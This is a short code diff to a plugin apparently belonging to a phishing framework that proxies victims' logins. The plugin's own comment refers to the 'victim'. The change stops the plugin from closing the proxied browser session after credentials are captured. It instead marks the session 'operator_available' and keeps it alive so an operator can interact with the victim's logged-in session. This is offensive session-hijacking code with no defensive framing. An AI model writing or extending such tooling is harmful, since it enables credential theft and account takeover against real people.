@@ -11,6 +11,7 @@ from shared.database import db, CredentialProxyJob, Template
 from shared.template_render import render_sandboxed
 from datetime import datetime
 import logging
+import time
 
 logger = logging.getLogger(__name__)
 
@@ -296,9 +297,9 @@ class SyncCredentialProxyPlugin(BasePlugin):
             # Create CredentialProxyJob record
             self._create_job_record(context, config, result, 'completed')
 
-            # Clean up session
-            manager.remove_session(proxy_session.session_id)
-            self._set_session_key(context, '_sync_proxy_session_id', None)
+            # Keep browser alive for operator interaction
+            proxy_session.state = 'operator_available'
+            proxy_session.last_activity = time.time()
 
             # Let the workflow continue — downstream nodes (e.g. Render Template,
             # Redirect) handle the response shown to the victim.
